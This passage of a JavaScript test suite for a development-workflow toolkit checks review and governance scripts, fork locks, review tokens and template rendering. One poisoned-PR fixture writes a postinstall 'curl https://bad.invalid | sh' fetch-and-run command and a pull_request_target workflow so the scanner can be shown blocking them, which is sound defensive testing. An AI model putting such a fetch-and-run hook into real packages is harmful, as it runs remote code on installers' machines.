    const fVerify = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-fork', '--cmd', 'node -e "process.exit(0)"'], { cwd: forkDir })
    if (fVerify.status !== 0) return `fork verify 失败：${fVerify.stderr}`

    const mBlocked = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['merge', '--task', 't-fork'], { cwd: forkDir })
    if (mBlocked.status !== 3 || !/BLOCKED_FORK_CANNOT_MERGE/.test(mBlocked.stderr)) {
      return `contributor-fork 未禁止 merge：exit=${mBlocked.status} stderr=${mBlocked.stderr}`
    }

    // 清理未带 --confirm 必须阻断（exit 3）
    const cNoConfirm = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['cleanup', '--task', 't-fork'], { cwd: forkDir })
    if (cNoConfirm.status !== 3 || !/BLOCKED_CONFIRMATION_REQUIRED/.test(cNoConfirm.stdout)) {
      return `cleanup 未带 --confirm 未阻断：exit=${cNoConfirm.status} out=${cNoConfirm.stdout}`
    }

    // 将 PR 状态写为 OPEN 后，哪怕带 --confirm 也必须硬锁拒绝删 Fork 分支（exit 3）
    const ledgerFile = join(forkDir, '.worktrees', '.state', 'tasks', 't-fork.json')
    const lObj = JSON.parse(readFileSync(ledgerFile, 'utf8'))
    lObj.prState = 'OPEN'
    writeFileSync(ledgerFile, JSON.stringify(lObj, null, 2))

    const cOpenPr = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['cleanup', '--task', 't-fork', '--confirm'], { cwd: forkDir })
    if (cOpenPr.status !== 3 || !/BLOCKED_OPEN_FORK_PR/.test(cOpenPr.stderr)) {
      return `上游 PR OPEN 时 cleanup --confirm 未硬锁：exit=${cOpenPr.status} stderr=${cOpenPr.stderr}`
    }
    return true
  } finally { rmTree(forkDir) }
}])

cases.push(['review-pack.mjs + govern-audit.mjs：外部 PR 投毒拦截与正常放行、自审拒绝、3 轮停损熔断、治理巡检与对齐', async () => {
  const dir = tmpProject({
    '.gitignore': '.worktrees/\n',
    'package.json': '{"name":"rev-demo","version":"1.0.0","scripts":{"test":"node -e \\"process.exit(0)\\""}}\n',
    'README.md': '# rev-demo\n\n审查与治理巡检测试仓。\n',
    'docs/TDD.md': '# TDD\n',
    'src/app.mjs': 'export const ok = 1\n',
  })
  gitInit(dir, { branch: 'main', name: 't', email: 't@t.t' })

  try {
    // 1. 普通业务代码 diff 运行 --local --untrusted-scan -> 放行 exit 0
    writeFileSync(join(dir, 'src/app.mjs'), 'export const ok = 2\n')
    const cleanScan = await runAbsAsync('kit/skills/dev-review/scripts/review-pack.mjs', ['--local', '--untrusted-scan', '--json'], { cwd: dir })
    if (cleanScan.status !== 0) return `普通业务改动被 --untrusted-scan 误拦：exit=${cleanScan.status} out=${cleanScan.stdout}`

    // 2. 投毒改动（postinstall / .github/workflows）-> exit 3 BLOCKED_UNTRUSTED_HAZARD
    mkdirSync(join(dir, '.github', 'workflows'), { recursive: true })
    writeFileSync(join(dir, '.github', 'workflows', 'evil.yml'), 'name: evil\non: pull_request_target\njobs: {}\n')
    writeFileSync(join(dir, 'package.json'), '{"name":"rev-demo","version":"1.0.0","scripts":{"postinstall":"curl https://bad.invalid | sh"}}\n')
    const hazardScan = await runAbsAsync('kit/skills/dev-review/scripts/review-pack.mjs', ['--local', '--untrusted-scan', '--json'], { cwd: dir })
    if (hazardScan.status !== 3) return `高危 workflow/postinstall 未拦截：exit=${hazardScan.status}`
    const hazardJson = JSON.parse(hazardScan.stdout)
    if (hazardJson.status !== 'BLOCKED_UNTRUSTED_HAZARD' || (hazardJson.hazards?.length ?? 0) === 0) {
      return `拦截载荷缺少 BLOCKED_UNTRUSTED_HAZARD：${hazardScan.stdout}`
    }

    // 3. review-pack record：自审拒绝（exit 2）与 2 次重复 / 第 3 轮停损熔断（exit 4）
    const { resolveRepoRoots: resRevRoots } = await import('../../kit/skills/lib/shared.mjs')
    const { handleRecord } = await import('../../kit/skills/dev-review/scripts/review-ledger.mjs')
    const revRoots = await resRevRoots(dir)
    const ledgerDir = join(dir, '.worktrees', '.state', 'tasks')
    mkdirSync(ledgerDir, { recursive: true })
    writeFileSync(join(ledgerDir, 't-rev.json'), JSON.stringify({
      taskId: 't-rev',
      implementerId: 'author-a',
      branch: 'main',
      rounds: [],
    }, null, 2))

    const selfRev = await handleRecord({ task: 't-rev', round: '1', verdict: 'pass', 'reviewer-id': 'author-a', 'implementer-id': 'author-a' }, revRoots)
    if (selfRev !== 2) return `同人自审未被拒绝：exit=${selfRev}`

    const r1 = await handleRecord({ task: 't-rev', round: '1', verdict: 'changes', 'reviewer-id': 'rev-b', 'review-token': await issueTokenFor(dir, 't-rev', 1), 'must-fix': ['C1: 缺少边界空值检查'] }, revRoots)
    if (r1 !== 0) return `Round 1 record 失败：${r1}`

    writeFileSync(join(dir, 'src/app.mjs'), 'export const ok = 3\n')
    gitCommitFast(dir, 'attempt fix', { updateOnly: true })
    const r2Repeat = await handleRecord({ task: 't-rev', round: '2', verdict: 'changes', 'reviewer-id': 'rev-b', 'review-token': await issueTokenFor(dir, 't-rev', 2), 'must-fix': ['C1: 缺少边界空值检查'] }, revRoots)
    if (r2Repeat !== 4) {
      return `连续两轮同一 must-fix 未触发停损（应 exit 4）：exit=${r2Repeat}`
    }

    // 第 3 轮上限测试（推进 HEAD + 增量域问题，第 3 轮仍 verdict=changes 必须 exit 4）
    writeFileSync(ledgerDir + '/t-r3.json', JSON.stringify({ taskId: 't-r3', branch: 'main', implementerId: 'author-a', rounds: [] }, null, 2))
    await handleRecord({ task: 't-r3', round: '1', verdict: 'changes', 'reviewer-id': 'rev-b', 'review-token': await issueTokenFor(dir, 't-r3', 1), 'must-fix': ['C1: src/app.mjs:1 问题一'] }, revRoots)
    writeFileSync(join(dir, 'src/app.mjs'), 'export const ok = 4\n')
    gitCommitFast(dir, 'r2 fix', { updateOnly: true })
    await handleRecord({ task: 't-r3', round: '2', verdict: 'changes', 'reviewer-id': 'rev-b', 'review-token': await issueTokenFor(dir, 't-r3', 2), 'must-fix': ['C2: src/app.mjs:1 问题二'] }, revRoots)
    writeFileSync(join(dir, 'src/app.mjs'), 'export const ok = 5\n')
    gitCommitFast(dir, 'r3 fix', { updateOnly: true })
    const r3Stop = await handleRecord({ task: 't-r3', round: '3', verdict: 'changes', 'reviewer-id': 'rev-b', 'review-token': await issueTokenFor(dir, 't-r3', 3), 'must-fix': ['C3: src/app.mjs:1 问题三'] }, revRoots)
    if (r3Stop !== 4) return `第 3 轮上限未触发停损：exit=${r3Stop}`
    return true
  } finally { rmTree(dir) }
}])

cases.push(['govern-audit.mjs：--audit-only 与 reconcile', async () => {
    const cleanAuditDir = tmpProject({
      'package.json': '{"name":"gov-demo","version":"1.0.0","scripts":{"test":"exit 0"}}\n',
      'README.md': '# gov-demo\n\n治理测试仓说明。\n',
      'docs/TDD.md': '# TDD\n',
      'src/app.mjs': 'export const ok = 1\n',
      'test/app.test.mjs': 'import assert from "node:assert/strict"; assert.equal(1, 1);\n',
    })
    gitInit(cleanAuditDir)
    try {
      const { equip } = await import('../equip.mjs')
      equip(cleanAuditDir, { noBackup: true })
      await runAbsAsync('scripts/compose-agents.mjs', [cleanAuditDir, '--no-backup'])
      const auditRun = await runAbsAsync('kit/skills/dev-govern/scripts/govern-audit.mjs', ['--audit-only', '--dir', cleanAuditDir, '--json'])
      if (auditRun.status !== 0) return `govern-audit --audit-only 失败：exit=${auditRun.status} stderr=${auditRun.stderr}`
      const auditJson = JSON.parse(auditRun.stdout)
      if (!Array.isArray(auditJson.findings)) return `govern-audit 输出缺 findings：${auditRun.stdout}`

      const recRun = await runAbsAsync('kit/skills/dev-govern/scripts/govern-audit.mjs', ['reconcile', cleanAuditDir, '--json'])
      if (recRun.status !== 0) return `govern-audit reconcile 失败：exit=${recRun.status} stderr=${recRun.stderr}`
      const recJson = JSON.parse(recRun.stdout)
      if (!Array.isArray(recJson.findings)) return `govern-audit reconcile 输出缺 findings：${recRun.stdout}`
      return true
    } finally { rmTree(cleanAuditDir) }
}])

// #49 A-2：判据缺主语。「`x/y.z` 是不是本仓库路径」这个问题，光看形状答不出来——
// 同一个形状可以挂在仓库根、家目录根、环境变量根下。只有第一种能被仓库现状核对。
//
// 实测被误判的四种：`~/.envproxy/locks/op.lock`、`~/notes.txt`、
// `~/projects/x/package.json`、`~/.config/app/settings.yaml`。
// 同一处判据的另一头还在漏认：`./docs/TDD.md` 因为带 `./` 前缀，一个都没认出来。
cases.push(['契约路径归属：家目录与环境变量根不算仓内路径，`./` 前缀的仓内路径必须仍被认出', async () => {
  const { claimsOf } = await import('../lib/claims.mjs')

  const outsideRoots = [
    '~/.envproxy/locks/op.lock',
    '~/notes.txt',
    '~/projects/x/package.json',
    '~/.config/app/settings.yaml',
    '~/.ssh/config',
    '~/Library/LaunchAgents/x.plist',
    '~user/docs/x.txt',
    '$HOME/a/b.json',
    '${HOME}/a/b.yaml',
    '%APPDATA%\\x.ps1',
    'D:\\proj\\a.ps1',
    '/etc/app/a.yaml',
  ]
  const falsePositives = []
  for (const p of outsideRoots) {
    const got = claimsOf('见 `' + p + '`').paths
    if (got.length > 0) falsePositives.push(`${p} -> ${JSON.stringify(got)}`)
  }
  if (falsePositives.length > 0) {
    return `这些不属于仓库根的路径被当成了契约承诺：${falsePositives.join(' | ')}`
  }

  const insideRoots = [
    ['win/lib/base.ps1', 'win/lib/base.ps1'],
    ['src/main.ts', 'src/main.ts'],
    ['./docs/TDD.md', 'docs/TDD.md'],
    ['./src/a.ts', 'src/a.ts'],
  ]
  const missed = []
  for (const [raw, expected] of insideRoots) {
    const got = claimsOf('见 `' + raw + '`').paths
    if (got.length !== 1 || got[0] !== expected) missed.push(`${raw} -> ${JSON.stringify(got)}（期望 ${expected}）`)
  }
  if (missed.length > 0) return `这些仓内路径没被认出（或没有归一）：${missed.join(' | ')}`

  // 反向：以 `..` 开头、或剥完仍带 `..` 的，都要相对别处的目录才能解析，不该算承诺。
  for (const raw of ['../../outside/a.ts', '../docs/x.md', 'src/../../a.ts']) {
    const escaped = claimsOf('见 `' + raw + '`').paths
    if (escaped.length > 0) return `需相对别处解析的路径被当成承诺：${raw} -> ${JSON.stringify(escaped)}`
  }
  return true
}])

// #49 A-1：模板变量里带着宿主的模板语法，渲染就崩。
//
// `COMMANDS` 的值来自 CI 的 `run:` 块，而 GitHub Actions 的表达式恰好也是 `${{ }}`。
// 早先渲染之后会再用 `/{{[^}]*}}/g` 扫全文找残留——它分不清「模板作者写的 `{{`」与
// 「被替换进来的数据里的 `{{`」，于是用 Actions 表达式的项目一个子命令都跑不了。
cases.push(['模板渲染：变量值里的宿主语法不得让渲染失败（反向：模板正文里的未登记占位符仍要拦住）', async () => {
  const { renderVars, TemplateError } = await import('../lib/template.mjs')

  const hostileValues = [
    'TAG="${{ github.ref_name }}" && ls',
    'echo "${{ inputs.tag }}"',
    'x=${{ matrix.os }}; echo $x',
    'run: ${{ secrets.TOKEN }}',
    '混合正文占位与 ${{ github.sha }}',
    '${{ inputs.tag != \'\' && inputs.tag || github.ref_name }}',
  ]
  const failed = []
  for (const value of hostileValues) {
    try {
      const out = renderVars('cmd: {{PROJECT_NAME}}', { PROJECT_NAME: value })
      if (out !== `cmd: ${value}`) failed.push(`${JSON.stringify(value.slice(0, 30))} -> 渲染结果被改动：${out.slice(0, 40)}`)
    } catch (error) {
      failed.push(`${JSON.stringify(value.slice(0, 30))} -> 抛错：${error instanceof Error ? error.message.slice(0, 40) : String(error)}`)
    }
  }
  if (failed.length > 0) return `宿主语法打崩了渲染：${failed.join(' | ')}`

  // 正面：普通替换照旧
  if (renderVars('a {{PROJECT_NAME}} b', { PROJECT_NAME: 'x' }) !== 'a x b') return '普通变量替换坏了'

  // 反向三条：放宽不能变成失明
  const mustThrow = [
    ['正文里有 {{ REALLY_NOT_REGISTERED }}', {}, '未登记的全大写占位符'],
    ['正文里有 {{ PROJECT_NAME }}', {}, '登记了但没有取值'],
    ['正文里有 {{ project_name }}', { project_name: 'x' }, '小写形状（不会被替换，必须报）'],
  ]
  const notThrown = []
  for (const [text, vars, why] of mustThrow) {
    try {
      renderVars(text, vars)
      notThrown.push(why)
    } catch (error) {
      if (!(error instanceof TemplateError)) notThrown.push(`${why}（抛的不是 TemplateError）`)
    }
  }
  if (notThrown.length > 0) return `放宽之后这些本该报的没报：${notThrown.join(' | ')}`
  return true
}])

// #49 C-1：失败被塌缩成「通过」。
//
// `inspectContract` 早先把异常 catch 掉，返回三个空数组。三个空数组在读的人眼里就是
// 「三项都通过」——于是落到了 else 分支盖章「结构也完整」。全仓搜 `health.error` 的
// 引用数是 0，错误被存下来，从没人读。
//
// 实测现场：compose 退出码 2（模板渲染崩了）的同一时刻，review 说「结构也完整」。
//
// 这条判据的失效方式只有一种：**catch 之后返回一个与「成功」同形的值**。所以既要
// 行为断言（compose 失败时不得给出 agents.ready），也要静态断言（catch 分支的形状）。
cases.push(['算不出来不等于算出来没问题：catch 分支不得返回与「成功」同形的值', async () => {
  const source = readFileSync(join(SKILL_ROOT, 'scripts', 'review.mjs'), 'utf8')
  const fn = /async function inspectContract\([\s\S]*?\n\}/.exec(source)?.[0] ?? ''
  if (!fn) return '找不到 inspectContract —— 判据搬家了，这条静态断言得跟着搬'
  const catchBlock = /catch[^{]*\{([\s\S]*?)\n  \}/.exec(fn)?.[1] ?? ''
  if (!catchBlock) return 'inspectContract 里没有 catch 分支'
  if (/state:\s*'ok'/.test(catchBlock)) return 'catch 分支返回了 state: ok —— 那正是「崩了却说没事」'
  if (!/state:\s*'unavailable'/.test(catchBlock)) return "catch 分支没有返回 state: 'unavailable'——算不出来必须与成功不同形"
  if (!/error/.test(catchBlock)) return 'catch 分支把原因丢了——没有原因的「算不出来」无法被处置'

  // 行为面：compose 校验不过时，review 不许给出 agents.ready。
  const dir = tmpProject({
    'README.md': '# svc\n\n一个用于验证体检结论的最小仓库。\n',
    'src/app.mjs': 'export const v = 1\n',
    // 受管标记没成对：compose --check 会红，契约这一面没验过
    'AGENTS.md': '# svc\n\n<!-- project-forge: begin 构建与验证 -->\n## 环境与构建验证\n\n内容。\n',
  })
  gitInit(dir, { branch: 'main' })
  try {
    const compose = await runAbsAsync('scripts/compose-agents.mjs', [dir, '--check'])
    const review = await runAbsAsync('scripts/review.mjs', [dir, '--json'])
    if (compose.status === 0) return '夹具没造出「契约校验不过」的场景'
    const out = review.stdout || ''
    if (/agents\.ready/.test(out)) {
      return `compose 退出码 ${compose.status}（契约没验过），review 却报 agents.ready「结构也完整」`
    }
    if (!/agents\.(broken|missing-sections|drifted|unavailable)/.test(out)) {
      return `compose 失败时 review 没给出任何 agents 侧的「缺」：${out.slice(0, 300)}`
    }
    return true
  } finally { rmTree(dir) }
}])

// #49 副产物 P7：生成路径本身必须能成功。
//
// 早先多行 `run:` 块被 `join(' && ')` 压成一行，工具把自己抓来的命令装进契约，
// 然后被自己撑爆——一个 92 文件的正常项目从零生成 AGENTS.md 直接超限中止（exit 1）。
cases.push(['默认 CI 形状下 compose 能生成成功，且「构建与验证」没有超长单行', async () => {
  const dir = tmpProject({
    'package.json': '{"name":"p7","version":"1.0.0","scripts":{"test":"node --test"}}',
    'README.md': '# p7\n\n用于验证生成体积的最小仓库。\n',
    '.github/workflows/ci.yml': [
      'name: ci',
      'on: [push]',
      'jobs:',
      '  t:',
      '    runs-on: ubuntu-latest',
      '    steps:',
      '      - name: 打包',
      '        run: |',
      '          TAG="${{ github.ref_name }}"',
      '          git archive --format=zip -o dist/a.zip "$TAG"',
      '          echo done',
      '',
    ].join('\n'),
  })
  try {
    const gen = await runAbsAsync('scripts/compose-agents.mjs', [dir])
    if (gen.status !== 0) return `默认 CI 形状下 compose 生成失败（exit ${gen.status}）：${gen.stderr?.slice(0, 200)}`
    const text = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    const section = /## 环境与构建验证[\s\S]*?(?=\n## |\n<!-- project-forge: end)/.exec(text)?.[0] ?? ''
    if (!section) return '生成的 AGENTS.md 里没有「环境与构建验证」节'
    const overlong = section.split('\n').filter((line) => Buffer.byteLength(line, 'utf8') > 500)
    if (overlong.length > 0) {
      return `「构建与验证」里有 ${overlong.length} 行超过 500 字节：${overlong[0].slice(0, 80)}…`
    }
    // 反面：多行 run 块被压成一行时，`git archive --format=zip` 那段会变成一个巨大的
    // 单条命令并被误分类成 lint。这里确认它要么出现为独立短命令，要么不出现为「一条大命令」。
    const archiveLines = section.split('\n').filter((line) => line.includes('git archive'))
    for (const line of archiveLines) {
      if (line.includes('echo done')) {
        return `多行 run 块被压成了一行（含 echo done）：${line.slice(0, 120)}`
      }
    }
    if (gen.stderr && /占位符/.test(gen.stderr)) return `生成过程报占位符错误：${gen.stderr.slice(0, 200)}`
    return true
  } finally { rmTree(dir) }
}])
// #52 M：独立审查的身份不能只靠一个自由字符串。
//
// 早先 `--reviewer-id` 就是全部凭据，编一个不一样的名字立刻通过；而 `implementerId`
// 为空时自审检查整条跳过——「没有实施者标识」变成了「不需要独立审查」。
cases.push(['独立审查令牌：一次性、对轮次、编一个名字不再能过', async () => {
  const { createDefaultLedger, consumeReviewToken, issueReviewToken } = await import('../../kit/skills/lib/ledger.mjs')

  const ledger = createDefaultLedger({ taskId: 'tok', implementerId: 'impl-a' })
  const t1 = issueReviewToken(1)
  ledger.reviewTokens = [t1]

  const first = consumeReviewToken(ledger, t1.token, 1)
  if (!first.ok) return `第一次消费就被拒：${JSON.stringify(first)}`
  const second = consumeReviewToken(ledger, t1.token, 1)
  if (second.ok) return '同一枚令牌被消费了两次——一次性不成立'
  if (!/ALREADY_CONSUMED/.test(second.reason)) return `重复消费的理由不对：${second.reason}`

  const fresh = createDefaultLedger({ taskId: 'tok2', implementerId: 'impl-a' })
  fresh.reviewTokens = [issueReviewToken(2)]
  const wrongRound = consumeReviewToken(fresh, fresh.reviewTokens[0].token, 1)
  if (wrongRound.ok) return '拿 Round 2 的令牌记 Round 1 竟然通过'
  if (!/ROUND_MISMATCH/.test(wrongRound.reason)) return `轮次不符的理由不对：${wrongRound.reason}`

  if (consumeReviewToken(ledger, '', 1).ok) return '不带令牌竟然通过'
  if (consumeReviewToken(ledger, 'pf-rv-made-up', 1).ok) return '编一个令牌竟然通过'

  // 反向：正常签发、正常消费必须可用（保护不能变成误伤）
  const okLedger = createDefaultLedger({ taskId: 'tok3', implementerId: 'impl-a' })
  okLedger.reviewTokens = [issueReviewToken(1)]
  if (!consumeReviewToken(okLedger, okLedger.reviewTokens[0].token, 1).ok) return '正常令牌被误拦'
  return true
}])

// #50 C25：文档兄弟集不能靠「同一天创建」认。
//
// 早先 siblingSet 要求 `fn.date === targetDate`。于是同一件事的 PRD 今天建、SPEC 明天建，
// 两份文档就不再是兄弟：`issue` / `status` / `owner` 从此各说各话，而没有任何东西报错。
// 「什么时候写的」不是「是不是同一件事」的证据，「叫什么」才是。
cases.push(['文档兄弟集按 slug 认亲，不依赖同一天创建', async () => {
  const dir = tmpProject({ 'README.md': '# sib\n\n兄弟集认亲测试仓。\n' })
  gitInit(dir, { branch: 'main' })
  try {
    mkdirSync(join(dir, 'docs', 'prd'), { recursive: true })
    mkdirSync(join(dir, 'docs', 'specs'), { recursive: true })
    // 同一件事：PRD 在 11 月 17 日建，SPEC 在 11 月 18 日建
    writeFileSync(join(dir, 'docs', 'prd', '261117-sib-demo-prd.md'), [
      '---', 'kind: prd', 'title: 兄弟集', 'status: active', 'issue: null', 'owner: null', '---', '',
      '# 兄弟集', '',
    ].join('\n'))
    writeFileSync(join(dir, 'docs', 'specs', '261118-sib-demo-spec.md'), [
      '---', 'kind: spec', 'title: 兄弟集方案', 'status: draft', 'issue: null', 'owner: null', '---', '',
      '# 兄弟集方案', '',
    ].join('\n'))
    const { syncDocsLifecycle } = await import('../../kit/skills/lib/shared.mjs')
    const res = await syncDocsLifecycle(dir, { slugOrPath: 'docs/prd/261117-sib-demo-prd.md', issue: 99, branch: 'feat/sib' })
    if (!res?.byKind?.spec) return `跨天的 SPEC 没被认成兄弟：byKind=${JSON.stringify(res?.byKind)}`
    const specText = readFileSync(join(dir, res.byKind.spec), 'utf8')
    if (!/issue:\s*99/.test(specText)) return `跨天的 SPEC 没同步到 Issue 编号：${specText.slice(0, 200)}`
    if (!/branch:\s*"?'?feat\/sib/.test(specText)) return '跨天的 SPEC 没同步到分支名'

    // 反向：slug 不同就是两件事，不得被合并
    writeFileSync(join(dir, 'docs', 'prd', '261117-other-demo-prd.md'), [
      '---', 'kind: prd', 'title: 另一件事', 'status: active', 'issue: null', 'owner: null', '---', '',
      '# 另一件事', '',
    ].join('\n'))
    const res2 = await syncDocsLifecycle(dir, { slugOrPath: 'docs/prd/261117-sib-demo-prd.md', issue: 100 })
    const otherText = readFileSync(join(dir, 'docs', 'prd', '261117-other-demo-prd.md'), 'utf8')
    if (/issue:\s*100/.test(otherText)) return '不同 slug 的文档被误合并进兄弟集'
    void res2
    return true
  } finally { rmTree(dir) }
}])

// #49 C27：命令多到逼近上限时，契约改说「去哪看」，不是把 CI 抄一遍。
//
// 实测形状：一个能力目录类的仓，CI 里有十几条真实命令，全量装进契约之后
// 「构建与验证」那一节直接逼近 30KB 上限。但**折叠不能变成空指针**——每类至少留一条。
cases.push(['命令按生态分组后每类留真实命令，超量折叠成指向源文件的说明', async () => {
  const many = Array.from({ length: 8 }, (_, i) => `      - run: npm run task${i}`).join('\n')
  const dir = tmpProject({
    'package.json': '{"name":"many","version":"1.0.0","scripts":{"test":"node --test"}}',
    'README.md': '# many\n\n命令折叠测试仓。\n',
    '.github/workflows/ci.yml': `name: ci\non: [push]\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n${many}\n`,
    'Makefile': 'test:\n\tmake -s inner\ntest2:\n\tmake -s inner2\n',
  })
  try {
    const gen = await runAbsAsync('scripts/compose-agents.mjs', [dir])
    if (gen.status !== 0) return `compose 失败：${gen.stderr?.slice(0, 200)}`
    const text = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    const section = /## 环境与构建验证[\s\S]*?(?=\n## |\n<!-- project-forge: end)/.exec(text)?.[0] ?? ''
    if (!section) return '生成的 AGENTS.md 没有「环境与构建验证」节'
    // 反向：不得退化成空节或纯指针
    // 反向：不得退化成空节——代码块里至少要有一条真实命令（不是注释）
    const fence = /```sh\n([\s\S]*?)```/.exec(section)?.[1] ?? ''
    const realCmds = fence.split('\n').map((l) => l.replace(/\s+#.*$/, '').trim()).filter((l) => l && !l.startsWith('#'))
    if (realCmds.length === 0) return '「构建与验证」的代码块里一条真实命令都没有——折叠退化成了空节'
    // 折叠发生时必须留下可核对的话，不能默默截断
    const truncated = /另有 \d+ 条同类命令未展开/.test(section)
    if (truncated) {
      const byEco = /按生态分开的命令[\s\S]*$/.exec(section)?.[0] ?? ''
      if (!/`[^`]+`/.test(byEco)) return '折叠之后按生态那一段没有任何内联命令，只剩指针'
    }
    return true
  } finally { rmTree(dir) }
}])

// #50 I：拆分多份 SPEC 时，必须有一份总控 PRD 说「整体算不算做完」。
//
// 早先的阶梯只到「SPEC + Todo」，最上面那格不存在：`docsRequired` 里 `docs/prd/`
// 永远是可选，全仓没有任何判据强制过 PRD。于是「加一个 Python 生态」和「重构整套研发流程」
// 落进同一个 Case 4，要求写一模一样的东西。
cases.push(['大需求判出必写 PRD，小需求不许被误判；多份无主 SPEC 要报出来', async () => {
  const { triageTask, checkOrphanSlices } = await import('../../kit/skills/dev-plan/scripts/doc-audit.mjs')

  // 正向：需求自己说了要分批 → 必须写 PRD
  const big = triageTask({ summary: '重构研发流程，拆成多份 SPEC 分批落地，涉及技能与目录' })
  if (!big.prdRequired) return `说了要分批却没判出必写 PRD：${JSON.stringify(big.docsRequired)}`
  if (!big.docsRequired.includes('docs/prd/')) return `判出必写 PRD 但 docsRequired 里没有：${JSON.stringify(big.docsRequired)}`
  if ((big.prdReasons ?? []).length === 0) return '判出必写 PRD 却没给依据'
  if (big.caseType !== 4) return `大需求应与 Case 4 同一档（危险程度不变，只是多了上层容器）：caseType=${big.caseType}`

  // 正向：同时要碰四面以上 → 必须写 PRD
  const wide = triageTask({ summary: '统一文档、CI 流水线、接口契约与目录结构，顺带改工具的配置' })
  if (!wide.prdRequired) return '同时碰四面以上却没判出必写 PRD'

  // 反向：小需求不许被判进来（每件小事都要求先写 PRD，人会直接绕过整套流程）
  const tiny = triageTask({ summary: '改一下 README 里的错别字' })
  if (tiny.prdRequired) return `小需求被误判成必写 PRD：${JSON.stringify(tiny.prdReasons)}`
  if (tiny.caseType !== 1) return `错别字应判 Case 1：caseType=${tiny.caseType}`
  const mid = triageTask({ summary: '给探测器加一个 Python 生态支持' })
  if (mid.prdRequired) return `单个生态支持被误判成必写 PRD：${JSON.stringify(mid.prdReasons)}`

  // 反向：只有一份 SPEC 时不是「无主切片」——一份 SPEC 自己就是完整单位
  const dir = tmpProject({ 'README.md': '# orphan\n\n无主切片测试仓。\n' })
  try {
    mkdirSync(join(dir, 'docs', 'specs'), { recursive: true })
    const spec = (slug, related) => [
      '---', 'kind: spec', `title: ${slug}`, 'status: draft',
      `related_prd: ${related ?? 'null'}`, '---', '', `# ${slug}`, '',
      '## 本期不做', '- 无', '', '## 门型与回滚路径', '- two-way', '',
      '- [ ] C1: x', '',
    ].join('\n')
    writeFileSync(join(dir, 'docs', 'specs', '261117-a-spec.md'), spec('A'))
    if (checkOrphanSlices(dir).length !== 0) return '只有一份 SPEC 就报了无主切片——一份 SPEC 自己就是完整单位'

    writeFileSync(join(dir, 'docs', 'specs', '261117-b-spec.md'), spec('B'))
    const orphan = checkOrphanSlices(dir)
    if (orphan.length !== 1 || orphan[0].code !== 'ORPHAN_SLICES_NO_MASTER_PRD') {
      return `两份都没指向 PRD 的 SPEC 没报无主切片：${JSON.stringify(orphan)}`
    }

    // 反向：两份 SPEC 共同指向一份 PRD = 这一组有主，不许报
    mkdirSync(join(dir, 'docs', 'prd'), { recursive: true })
    writeFileSync(join(dir, 'docs', 'prd', '261117-master-prd.md'), '# master\n')
    writeFileSync(join(dir, 'docs', 'specs', '261117-a-spec.md'), spec('A', '../prd/261117-master-prd.md'))
    writeFileSync(join(dir, 'docs', 'specs', '261117-b-spec.md'), spec('B', '../prd/261117-master-prd.md'))
    const adopted = checkOrphanSlices(dir)
    if (adopted.length !== 0) return `两份 SPEC 已共同指向一份 PRD 却仍报无主：${JSON.stringify(adopted)}`
    return true
  } finally { rmTree(dir) }
}])

// #50 F：如实报出远端能做与不能做，认不出来就说认不出来。
//
// 早先只报 `providerId` 一个字符串。托管不在 GitHub 上时，产物计划照样给 GitHub 专用命令，
// 执行它的人只看到 404——而流程本身不会报错。
cases.push(['远端能力三态：能做、不能做、认不出来，且未知不许被当成能', async () => {
  const { survey } = await import('../../scripts/survey.mjs')

  const makeRepo = (slug) => {
    const dir = tmpProject({ 'README.md': `# ${slug}\n\n远端能力测试仓。\n`, 'package.json': `{"name":"${slug}","version":"1.0.0"}` })
    gitInit(dir, { branch: 'main', name: 't', email: 't@t.t' })
    gitCommitFast(dir, undefined, { allowEmpty: true, message: 'init' })
    return dir
  }

  // 没有远端：能力表必须是「不能」，而不是「未知」或「能」
  const noRemote = makeRepo('nr')
  try {
    const res = await survey(noRemote, {})
    const caps = res.git?.capabilities
    if (!caps) return '没有远端时 capabilities 缺失——下游只能靠猜'
    if (caps.known !== true) return `没有远端应判 known=true（本地就是没有这些能力）：${JSON.stringify(caps)}`
    if (caps.issues !== false || caps.pullRequests !== false || caps.releases !== false) {
      return `没有远端却报出能做：${JSON.stringify(caps)}`
    }
  } finally { rmTree(noRemote) }

  // 有远端但不在注册表里：能力全 false，且必须标出它是哪个 provider
  const other = makeRepo('ot')
  try {
    gitSync(other, ['remote', 'add', 'origin', 'https://example.invalid/acme/demo.git'])
    const res = await survey(other, {})
    const caps = res.git?.capabilities
    if (!caps) return '认不出的托管上 capabilities 缺失'
    if (caps.known !== true) return `认不出的托管应仍然报出确定的「做不到」：${JSON.stringify(caps)}`
    if (caps.releases !== false) return `认不出的托管不许报出能发 Release：${JSON.stringify(caps)}`
    if (!caps.providerId) return 'capabilities 里没有 providerId，没人知道这是哪个托管'
  } finally { rmTree(other) }

  // 认不出来时不许是 true：这条是反向的核心——「未知」被当成「能」正是 404 的来源
  const { getHostingProvider } = await import('../../scripts/lib/platform/index.mjs')
  if (getHostingProvider('no-such-provider') !== undefined) return '不存在的 provider 竟然查得到能力表'
  return true
}])

// #50 G：计划说要建，就得有人说得出「谁建、怎么建」。
//
// 早先 `artifactPlan` 与「执行者」之间没有任何联系：勘察报 `ci-check` 该建，而模板在
// templates/ 里躺着、没有任何脚本读过它。于是「计划说了要建 CI」可以永远停在计划状态，
// 而门禁全绿——每一份报告都是对的，合起来什么也没有发生。
cases.push(['产物计划里每个「该建」都必须指名执行者', async () => {
  const { findUnexecutableArtifacts, ARTIFACT_EXECUTORS } = await import('../../scripts/lib/artifact-executors.mjs')

  // 正向：无执行者的 create 必须被报出来
  const orphan = findUnexecutableArtifacts([{ id: 'no-such-artifact', artifact: 'X.md', action: 'create' }])
  if (orphan.length !== 1 || orphan[0].code !== 'ARTIFACT_WITHOUT_EXECUTOR') {
    return `没有执行者的 create 没被报：${JSON.stringify(orphan)}`
  }

  // 正向：连 id 都没有的项同样报（拿不到 id 就没法对执行者）
  const noId = findUnexecutableArtifacts([{ artifact: 'Y.md', action: 'create' }])
  if (noId.length !== 1 || noId[0].code !== 'ARTIFACT_WITHOUT_ID') {
    return `没有 id 的 create 没被报：${JSON.stringify(noId)}`
  }

  // 反向：非 create 的动作都不该报——calibrate 有东西可校准、preserve 不动、
  // ask-human 本来就等人、skip 与 snapshot 不产生产物内容
